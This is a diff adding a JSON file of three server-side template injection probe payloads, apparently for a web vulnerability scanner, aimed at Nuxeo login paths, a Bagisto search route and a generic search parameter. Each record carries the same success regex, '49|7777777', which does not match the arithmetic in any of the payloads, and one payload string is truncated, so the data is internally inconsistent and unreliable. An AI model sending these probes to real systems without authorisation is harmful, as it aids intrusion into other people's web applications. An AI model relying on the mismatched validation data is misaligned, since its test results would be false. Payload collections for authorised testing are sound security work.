@@ -1,0 +1,35 @@
+[
+  {
+    "payload_id": "OWP-406871",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/nuxeo/login.jsp/pwn${31333333330+7}.xhtml",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "49|7777777"
+    }
+  },
+  {
+    "payload_id": "OWP-407146",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/bagisto-common/search?query={{2288*",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "49|7777777"
+    }
+  },
+  {
+    "payload_id": "OWP-407369",
+    "vulnerability_category": "Injection (SSTI)",
+    "target_technology": "Generic",
+    "injection_point": "path_parameter",
+    "payload_string": "/search?search_key=%7B%7B1337*1338%7D%7D",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "49|7777777"
+    }
+  }
+]
